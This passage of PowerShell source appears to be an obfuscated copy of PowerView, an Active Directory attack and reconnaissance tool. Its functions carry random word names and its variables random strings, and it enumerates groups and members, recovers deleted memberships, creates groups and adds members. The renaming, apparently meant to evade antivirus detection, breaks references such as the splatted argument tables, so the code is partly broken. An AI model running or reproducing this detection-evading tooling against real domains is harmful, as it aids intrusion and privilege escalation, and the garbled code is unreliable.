                            Write-Verbose "[deform] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                            $zLdPCUTB99['Domain'] = $cIRoWbek99
                            $dunucDiM99 = breading @SearcherArguments
                            if (-not $dunucDiM99) {
                                Write-Warning "[deform] Unable to retrieve domain searcher for '$cIRoWbek99'"
                            }
                        }
                    }
                    elseif ($MFlrbkhb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $yhPDRNjn99 = (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                    }
                    elseif ($MFlrbkhb99.Contains('\')) {
                        $IPeanipX99 = $MFlrbkhb99.Replace('\28', '(').Replace('\29', ')') | intrenches -vxxrLejt99 Canonical
                        if ($IPeanipX99) {
                            $OSOvmOhH99 = $IPeanipX99.SubString(0, $IPeanipX99.IndexOf('/'))
                            $sWPGjowW99 = $MFlrbkhb99.Split('\')[1]
                            $waAVGUFD99 += "(samAccountName=$sWPGjowW99)"
                            $zLdPCUTB99['Domain'] = $OSOvmOhH99
                            Write-Verbose "[deform] Extracted domain '$OSOvmOhH99' from '$MFlrbkhb99'"
                            $dunucDiM99 = breading @SearcherArguments
                        }
                    }
                    else {
                        $waAVGUFD99 += "(|(samAccountName=$MFlrbkhb99)(name=$MFlrbkhb99))"
                    }
                }
                if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                    $nQZyhrEp99 += "(|$waAVGUFD99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[deform] Searching for adminCount=1'
                    $nQZyhrEp99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $zFtKfXsD99 = $PSBoundParameters['GroupScope']
                    $nQZyhrEp99 = Switch ($zFtKfXsD99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[deform] Searching for group scope '$zFtKfXsD99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $NSBobcyk99 = $PSBoundParameters['GroupProperty']
                    $nQZyhrEp99 = Switch ($NSBobcyk99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[deform] Searching for group property '$NSBobcyk99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[deform] Using additional LDAP filter: $gzpPmKdI99"
                    $nQZyhrEp99 += "$gzpPmKdI99"
                }
                $dunucDiM99.filter = "(&(objectCategory=group)$nQZyhrEp99)"
                Write-Verbose "[deform] filter string: $($dunucDiM99.filter)"
                if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $dunucDiM99.FindOne() }
                else { $NtqBcYnO99 = $dunucDiM99.FindAll() }
                $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = decaffeinating -PvRupVWt99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($NtqBcYnO99) {
                    try { $NtqBcYnO99.dispose() }
                    catch {
                        Write-Verbose "[deform] Error disposing of the Results object"
                    }
                }
                $dunucDiM99.dispose()
            }
        }
    }
}
function torrents {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $OaqRhTVK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $IGRKXOgn99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YuDsZOyX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    $otRfppJF99 = @{
        'Identity' = $OaqRhTVK99
    }
    if ($PSBoundParameters['Domain']) { $otRfppJF99['Domain'] = $jeGdZvYa99 }
    if ($PSBoundParameters['Credential']) { $otRfppJF99['Credential'] = $DOZPHpup99 }
    $PtKFiSBc99 = sincerer @ContextArguments
    if ($PtKFiSBc99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($PtKFiSBc99.Context)
        $Group.SamAccountName = $PtKFiSBc99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $PtKFiSBc99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $IGRKXOgn99
        }
        else {
            $Group.DisplayName = $PtKFiSBc99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $YuDsZOyX99
        }
        Write-Verbose "[torrents] Attempting to create group '$OaqRhTVK99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[torrents] Group '$OaqRhTVK99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[torrents] Error creating group '$OaqRhTVK99' : $_"
        }
    }
}
function neared {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $zLdPCUTB99['Domain'] = $jeGdZvYa99
            $zXzbbNbr99 = $jeGdZvYa99
        }
        else {
            $zXzbbNbr99 = $Env:USERDNSDOMAIN
        }
        deform @SearcherArguments | ForEach-Object {
            $zLdPCUTB99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $zLdPCUTB99['Identity'] = $_.managedBy
            $Null = $zLdPCUTB99.Remove('LDAPFilter')
            $ozmdImtx99 = cupped @SearcherArguments
            $yZpPgIHn99 = New-Object PSObject
            $yZpPgIHn99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $yZpPgIHn99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $yZpPgIHn99 | Add-Member Noteproperty 'ManagerName' $ozmdImtx99.samaccountname
            $yZpPgIHn99 | Add-Member Noteproperty 'ManagerDistinguishedName' $ozmdImtx99.distinguishedName
            if ($ozmdImtx99.samaccounttype -eq 0x10000000) {
                $yZpPgIHn99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($ozmdImtx99.samaccounttype -eq 0x30000000) {
                $yZpPgIHn99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $rMfAPmUL99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $rMfAPmUL99['Server'] = $YdBDxrjg99 }
            if ($PSBoundParameters['SearchScope']) { $rMfAPmUL99['SearchScope'] = $eLpWCwqM99 }
            if ($PSBoundParameters['ResultPageSize']) { $rMfAPmUL99['ResultPageSize'] = $xRYvUWYi99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $rMfAPmUL99['ServerTimeLimit'] = $vqNdfRPs99 }
            if ($PSBoundParameters['Tombstone']) { $rMfAPmUL99['Tombstone'] = $CnaAXLuN99 }
            if ($PSBoundParameters['Credential']) { $rMfAPmUL99['Credential'] = $DOZPHpup99 }
            $yZpPgIHn99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $yZpPgIHn99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $yZpPgIHn99
        }
    }
}
function expostulation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $XDJikegf99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $VKvoUXMe99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $WYZNomjg99 = @{}
        if ($PSBoundParameters['Domain']) { $WYZNomjg99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $WYZNomjg99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Credential']) { $WYZNomjg99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        $dunucDiM99 = breading @SearcherArguments
        if ($dunucDiM99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $zLdPCUTB99['Identity'] = $fqOhNdkk99
                $zLdPCUTB99['Raw'] = $True
                $Group = deform @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[expostulation] Error searching for group with identity: $fqOhNdkk99"
                }
                else {
                    $sdObxkDM99 = $Group.properties.item('samaccountname')[0]
                    $ngpYIwUP99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $QINdlJMD99 = $jeGdZvYa99
                    }
                    else {
                        if ($ngpYIwUP99) {
                            $QINdlJMD99 = $ngpYIwUP99.SubString($ngpYIwUP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[expostulation] Using LDAP matching rule to recurse on '$ngpYIwUP99', only user accounts will be returned."
                    $dunucDiM99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$ngpYIwUP99))"
                    $dunucDiM99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $ztqsVgXN99 = $dunucDiM99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $zLdPCUTB99.Remove('Raw')
            }
            else {
                $waAVGUFD99 = ''
                $nQZyhrEp99 = ''
                $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                    $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($MFlrbkhb99 -match '^S-1-') {
                        $waAVGUFD99 += "(objectsid=$MFlrbkhb99)"
                    }
                    elseif ($MFlrbkhb99 -match '^CN=') {
                        $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[expostulation] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                            $zLdPCUTB99['Domain'] = $cIRoWbek99
                            $dunucDiM99 = breading @SearcherArguments
                            if (-not $dunucDiM99) {
                                Write-Warning "[expostulation] Unable to retrieve domain searcher for '$cIRoWbek99'"
                            }
                        }
                    }
                    elseif ($MFlrbkhb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $yhPDRNjn99 = (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                    }
                    elseif ($MFlrbkhb99.Contains('\')) {
                        $IPeanipX99 = $MFlrbkhb99.Replace('\28', '(').Replace('\29', ')') | intrenches -vxxrLejt99 Canonical
                        if ($IPeanipX99) {
                            $OSOvmOhH99 = $IPeanipX99.SubString(0, $IPeanipX99.IndexOf('/'))
                            $sWPGjowW99 = $MFlrbkhb99.Split('\')[1]
                            $waAVGUFD99 += "(samAccountName=$sWPGjowW99)"
                            $zLdPCUTB99['Domain'] = $OSOvmOhH99
                            Write-Verbose "[expostulation] Extracted domain '$OSOvmOhH99' from '$MFlrbkhb99'"
                            $dunucDiM99 = breading @SearcherArguments
                        }
                    }
                    else {
                        $waAVGUFD99 += "(samAccountName=$MFlrbkhb99)"
                    }
                }
                if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                    $nQZyhrEp99 += "(|$waAVGUFD99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[expostulation] Using additional LDAP filter: $gzpPmKdI99"
                    $nQZyhrEp99 += "$gzpPmKdI99"
                }
                $dunucDiM99.filter = "(&(objectCategory=group)$nQZyhrEp99)"
                Write-Verbose "[expostulation] expostulation filter string: $($dunucDiM99.filter)"
                try {
                    $sBoEOClb99 = $dunucDiM99.FindOne()
                }
                catch {
                    Write-Warning "[expostulation] Error searching for group with identity '$fqOhNdkk99': $_"
                    $ztqsVgXN99 = @()
                }
                $sdObxkDM99 = ''
                $ngpYIwUP99 = ''
                if ($sBoEOClb99) {
                    $ztqsVgXN99 = $sBoEOClb99.properties.item('member')
                    if ($ztqsVgXN99.count -eq 0) {
                        $wnWHKMnU99 = $False
                        $rsSxsepb99 = 0
                        $Top = 0
                        while (-not $wnWHKMnU99) {
                            $Top = $rsSxsepb99 + 1499
                            $AygaFpZa99="member;range=$rsSxsepb99-$Top"
                            $rsSxsepb99 += 1500
                            $Null = $dunucDiM99.PropertiesToLoad.Clear()
                            $Null = $dunucDiM99.PropertiesToLoad.Add("$AygaFpZa99")
                            $Null = $dunucDiM99.PropertiesToLoad.Add('samaccountname')
                            $Null = $dunucDiM99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $sBoEOClb99 = $dunucDiM99.FindOne()
                                $soNpyrIR99 = $sBoEOClb99.Properties.PropertyNames -like "member;range=*"
                                $ztqsVgXN99 += $sBoEOClb99.Properties.item($soNpyrIR99)
                                $sdObxkDM99 = $sBoEOClb99.properties.item('samaccountname')[0]
                                $ngpYIwUP99 = $sBoEOClb99.properties.item('distinguishedname')[0]
                                if ($ztqsVgXN99.count -eq 0) {
                                    $wnWHKMnU99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $wnWHKMnU99 = $True
                            }
                        }
                    }
                    else {
                        $sdObxkDM99 = $sBoEOClb99.properties.item('samaccountname')[0]
                        $ngpYIwUP99 = $sBoEOClb99.properties.item('distinguishedname')[0]
                        $ztqsVgXN99 += $sBoEOClb99.Properties.item($soNpyrIR99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $QINdlJMD99 = $jeGdZvYa99
                    }
                    else {
                        if ($ngpYIwUP99) {
                            $QINdlJMD99 = $ngpYIwUP99.SubString($ngpYIwUP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($BlVyUnEr99 in $ztqsVgXN99) {
                if ($XDJikegf99 -and $KPtKBUbt99) {
                    $PvRupVWt99 = $_.Properties
                }
                else {
                    $mLlokiUt99 = $zLdPCUTB99.Clone()
                    $mLlokiUt99['Identity'] = $BlVyUnEr99
                    $mLlokiUt99['Raw'] = $True
                    $mLlokiUt99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = cupped @ObjectSearcherArguments
                    $PvRupVWt99 = $Object.Properties
                }
                if ($PvRupVWt99) {
                    $goCmuJCu99 = New-Object PSObject
                    $goCmuJCu99 | Add-Member Noteproperty 'GroupDomain' $QINdlJMD99
                    $goCmuJCu99 | Add-Member Noteproperty 'GroupName' $sdObxkDM99
                    $goCmuJCu99 | Add-Member Noteproperty 'GroupDistinguishedName' $ngpYIwUP99
                    if ($PvRupVWt99.objectsid) {
                        $qiSfawjM99 = ((New-Object System.Security.Principal.SecurityIdentifier $PvRupVWt99.objectsid[0], 0).Value)
                    }
                    else {
                        $qiSfawjM99 = $Null
                    }
                    try {
                        $HEYPkrlM99 = $PvRupVWt99.distinguishedname[0]
                        if ($HEYPkrlM99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $qiSfawjM99) {
                                    $qiSfawjM99 = $PvRupVWt99.cn[0]
                                }
                                $TCsofWyN99 = intrenches -fqOhNdkk99 $qiSfawjM99 -vxxrLejt99 'DomainSimple' @ADNameArguments
                                if ($TCsofWyN99) {
                                    $YKMrlVYS99 = $TCsofWyN99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[expostulation] Error converting $HEYPkrlM99"
                                    $YKMrlVYS99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[expostulation] Error converting $HEYPkrlM99"
                                $YKMrlVYS99 = $Null
                            }
                        }
                        else {
                            $YKMrlVYS99 = $HEYPkrlM99.SubString($HEYPkrlM99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $HEYPkrlM99 = $Null
                        $YKMrlVYS99 = $Null
                    }
                    if ($PvRupVWt99.samaccountname) {
                        $EhoMnepi99 = $PvRupVWt99.samaccountname[0]
                    }
                    else {
                        try {
                            $EhoMnepi99 = bandaging -ObjectSID $PvRupVWt99.cn[0] @ADNameArguments
                        }
                        catch {
                            $EhoMnepi99 = $PvRupVWt99.cn[0]
                        }
                    }
                    if ($PvRupVWt99.objectclass -match 'computer') {
                        $SHjqFoMf99 = 'computer'
                    }
                    elseif ($PvRupVWt99.objectclass -match 'group') {
                        $SHjqFoMf99 = 'group'
                    }
                    elseif ($PvRupVWt99.objectclass -match 'user') {
                        $SHjqFoMf99 = 'user'
                    }
                    else {
                        $SHjqFoMf99 = $Null
                    }
                    $goCmuJCu99 | Add-Member Noteproperty 'MemberDomain' $YKMrlVYS99
                    $goCmuJCu99 | Add-Member Noteproperty 'MemberName' $EhoMnepi99
                    $goCmuJCu99 | Add-Member Noteproperty 'MemberDistinguishedName' $HEYPkrlM99
                    $goCmuJCu99 | Add-Member Noteproperty 'MemberObjectClass' $SHjqFoMf99
                    $goCmuJCu99 | Add-Member Noteproperty 'MemberSID' $qiSfawjM99
                    $goCmuJCu99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $goCmuJCu99
                    if ($PSBoundParameters['Recurse'] -and $HEYPkrlM99 -and ($SHjqFoMf99 -match 'group')) {
                        Write-Verbose "[expostulation] Manually recursing on group: $HEYPkrlM99"
                        $zLdPCUTB99['Identity'] = $HEYPkrlM99
                        $Null = $zLdPCUTB99.Remove('Properties')
                        expostulation @SearcherArguments
                    }
                }
            }
            $dunucDiM99.dispose()
        }
    }
}
function cruelest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $zLdPCUTB99['Identity'] = $fqOhNdkk99 }
        cupped @SearcherArguments | ForEach-Object {
            $azPUroAG99 = $_.Properties['distinguishedname'][0]
            ForEach($FErQptwd99 in $_.Properties['msds-replvaluemetadata']) {
                $dqzScCJu99 = [xml]$FErQptwd99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($dqzScCJu99) {
                    if (($dqzScCJu99.pszAttributeName -Match 'member') -and (($dqzScCJu99.dwVersion % 2) -eq 0 )) {
                        $wzSptcsg99 = New-Object PSObject
                        $wzSptcsg99 | Add-Member NoteProperty 'GroupDN' $azPUroAG99
                        $wzSptcsg99 | Add-Member NoteProperty 'MemberDN' $dqzScCJu99.pszObjectDn
                        $wzSptcsg99 | Add-Member NoteProperty 'TimeFirstAdded' $dqzScCJu99.ftimeCreated
                        $wzSptcsg99 | Add-Member NoteProperty 'TimeDeleted' $dqzScCJu99.ftimeDeleted
                        $wzSptcsg99 | Add-Member NoteProperty 'LastOriginatingChange' $dqzScCJu99.ftimeLastOriginatingChange
                        $wzSptcsg99 | Add-Member NoteProperty 'TimesAdded' ($dqzScCJu99.dwVersion / 2)
                        $wzSptcsg99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $dqzScCJu99.pszLastOriginatingDsaDN
                        $wzSptcsg99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $wzSptcsg99
                    }
                }
                else {
                    Write-Verbose "[cruelest] Error retrieving 'msds-replvaluemetadata' for '$azPUroAG99'"
                }
            }
        }
    }
}
function wags {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $fqOhNdkk99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $ztqsVgXN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $otRfppJF99 = @{
            'Identity' = $fqOhNdkk99
        }
        if ($PSBoundParameters['Domain']) { $otRfppJF99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Credential']) { $otRfppJF99['Credential'] = $DOZPHpup99 }
        $rMIYjjCH99 = sincerer @ContextArguments
        if ($rMIYjjCH99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($rMIYjjCH99.Context, $rMIYjjCH99.Identity)
            }
            catch {
                Write-Warning "[wags] Error finding the group identity '$fqOhNdkk99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($BlVyUnEr99 in $ztqsVgXN99) {
                if ($BlVyUnEr99 -match '.+\\.+') {
                    $otRfppJF99['Identity'] = $BlVyUnEr99
                    $qwawVuYU99 = sincerer @ContextArguments
                    if ($qwawVuYU99) {
                        $GMxPBqaF99 = $qwawVuYU99.Identity
                    }
                }
                else {
                    $qwawVuYU99 = $rMIYjjCH99
                    $GMxPBqaF99 = $BlVyUnEr99
                }
                Write-Verbose "[wags] Adding member '$BlVyUnEr99' to group '$fqOhNdkk99'"
                $BlVyUnEr99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($qwawVuYU99.Context, $GMxPBqaF99)
                $Group.Members.Add($BlVyUnEr99)
                $Group.Save()
            }
        }
    }
}
function abjuration {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $fqOhNdkk99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $ztqsVgXN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
